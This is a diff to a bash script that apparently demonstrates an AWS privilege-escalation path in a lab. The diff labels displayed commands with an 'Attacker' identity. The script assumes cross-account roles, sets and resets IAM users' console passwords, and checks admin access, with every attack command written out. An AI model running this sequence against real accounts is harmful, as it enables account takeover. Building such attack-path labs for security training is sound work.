@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -50,7 +52,7 @@ if ! aws sts get-caller-identity &> /dev/null; then
 fi
 
 echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
-show_cmd aws sts get-caller-identity --output json
+show_cmd "Attacker" "aws sts get-caller-identity --output json"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
 echo "Current identity:"
 echo "$CURRENT_IDENTITY" | jq '.'
@@ -74,7 +76,7 @@ echo "Attempting to assume the pl-helpdesk role in dev account..."
 HELPDESK_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-helpdesk"
 echo "Attempting to assume role: $HELPDESK_ROLE_ARN"
 
-show_attack_cmd aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json"
 if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json 2>&1); then
     echo -e "${GREEN}✓ Successfully assumed helpdesk role!${NC}"
     echo ""
@@ -93,7 +95,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
     echo "Using helpdesk role to create a login profile for pl-Josh user..."
 
     # Create a login profile for Josh user
-    show_attack_cmd aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required
+    show_attack_cmd "Attacker" "aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required"
     if aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully created login profile for pl-Josh!${NC}"
         echo ""
@@ -125,7 +127,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
 
         echo "Attempting to assume role: $TRUSTSDEV_ROLE_ARN"
 
-        show_attack_cmd aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json
+        show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json"
         if TRUSTSDEV_CREDENTIALS=$(aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json 2>&1); then
             echo -e "${GREEN}✓ Successfully assumed trustsdev role in prod!${NC}"
             echo ""
@@ -144,7 +146,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
             echo "Using trustsdev role to update pl-Jeremy's login profile..."
 
             # Update Jeremy's login profile
-            show_attack_cmd aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required
+            show_attack_cmd "Attacker" "aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required"
             if aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required 2>/dev/null; then
                 echo -e "${GREEN}✓ Successfully updated login profile for pl-Jeremy!${NC}"
                 echo ""
@@ -161,12 +163,12 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
 
                     # Test admin permissions
                     echo "Testing admin permissions..."
-                    show_cmd aws iam list-users --output json
+                    show_cmd "Attacker" "aws iam list-users --output json"
                     if aws iam list-users --output json > /dev/null 2>&1; then
                         echo -e "${GREEN}✓ Can list IAM users (admin permission confirmed)${NC}"
                     fi
 
-                    show_cmd aws s3 ls
+                    show_cmd "Attacker" "aws s3 ls"
                     if aws s3 ls > /dev/null 2>&1; then
                         echo -e "${GREEN}✓ Can list S3 buckets (admin permission confirmed)${NC}"
                     fi
